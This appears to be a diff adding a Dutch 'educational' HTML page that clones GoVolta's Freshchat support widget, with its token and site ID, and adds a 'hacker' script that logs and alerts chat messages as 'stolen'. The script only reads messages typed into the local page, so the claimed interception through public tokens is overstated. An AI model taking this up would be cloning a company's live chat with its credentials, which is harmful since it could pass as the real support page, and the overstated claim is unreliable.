@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Onderwijs Project: API Token Validatie</title>
+    
+    <style>
+        body { font-family: sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 2rem; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; max-width: 600px; }
+        h1 { color: #0C7BFE; }
+        code { background: #eee; padding: 0.2rem 0.4rem; border-radius: 4px; font-family: monospace; }
+        .warning { color: #d93025; font-weight: bold; margin-top: 1rem; }
+        .status-box { margin-top: 1rem; padding: 10px; border: 1px solid #ccc; background: #fafafa; font-size: 0.9rem; }
+    </style>
+
+    <!-- 1. De Pre-Chat Template -->
+    <script>
+    var preChatTemplate = {
+        mainbgColor: '#0C7BFE',
+        maintxColor: '#fff',
+        heading: 'Onderwijs Demo Chat',
+        textBanner: "Dit is een educatieve kopie van de GoVolta chat.",
+        SubmitLabel: 'Start Chat',
+        fields: {
+            field1: { type: "name", label: "Naam", fieldId: "name", required: "yes", error: "Vul een naam in" },
+            field2: { type: "email", label: "E-mailadres", fieldId: "email", required: "yes", error: "Vul een geldig e-mailadres in" },
+            field3: { type: "text", label: "Referentienummer boeking", fieldId: "rn", required: "no", error: "Ongeldig nummer" }
+        }
+    };
+    </script>
+
+    <!-- 2. De volledige Freshchat Settings -->
+    <script>
+    window.fcSettings = {
+        token: "6cd66785-bb74-44c8-94d6-71e68ffd1b42",
+        host: "https://wchat.freshchat.com",
+        siteId: "govolta.nl", 
+        config: {
+            cssNames: {
+                widget: 'custom_fc_frame',
+                expanded: 'custom_fc_expanded'
+            }
+        },
+        onInit: function() {
+            console.log("Widget onInit uitgevoerd...");
+            if (window.fcPreChatform) {
+                fcPreChatform.fcWidgetInit(preChatTemplate);
+            }
+        }
+    };
+    </script>
+
+    <!-- 3. De benodigde Freshchat bibliotheken -->
+    <script src="https://wchat.freshchat.com/js/widget.js" async></script>
+    <script src="https://snippets.freshchat.com/js/fc-pre-chat-form-v2.js" defer></script>
+
+</head>
+<body>
+
+    <div class="card">
+        <h1>Educatieve Omgeving</h1>
+        <p>Je draait nu een lokale kopie van de <code>Freshchat</code> integratie.</p>
+        <p><strong>Demonstratie:</strong> Onderscheppen van chatberichten via publieke tokens.</p>
+        
+        <div id="hackerStatus" class="status-box">
+            Wachten op widget...
+        </div>
+
+        <div class="warning">
+            Druk op F12 en bekijk de Console om de 'gestolen' data te zien.
+        </div>
+    </div>
+
+    <!-- 4. Het Hacker Script met Error Handling & Interval -->
+<script>
+  function startHackerMode() {
+    if (typeof window.fcWidget !== 'undefined' && window.fcWidget.on) {
+      console.log("%c ⚠️ HACKER SCANNER GEACTIVEERD", "background: red; color: white; padding: 5px;");
+
+      window.fcWidget.on('message:sent', function(data) {
+        console.log("Full Data Packet:", data); // Laat de hele 'doos' zien in de console
+
+        // We zoeken op 3 verschillende plekken naar de tekst
+        let tekst = "Niet gevonden";
+        
+        if (data.message) {
+            tekst = data.message.content || data.message.text || data.message.body;
+        } else if (data.content) {
+            tekst = data.content.text || data.content;
+        }
+
+        if (tekst === undefined || tekst === null) {
+            tekst = "GEHEIM BERICHT (Structuur onbekend)";
+        }
+
+        console.log("%c 📥 GESTOLEN TEKST: " + tekst, "color: yellow; background: black; font-size: 14px;");
+        alert("HACKER ZIET: " + tekst);
+      });
+
+      clearInterval(hackerInterval);
+    }
+  }
+  var hackerInterval = setInterval(startHackerMode, 500);
+</script>
+
+</body>
+</html>
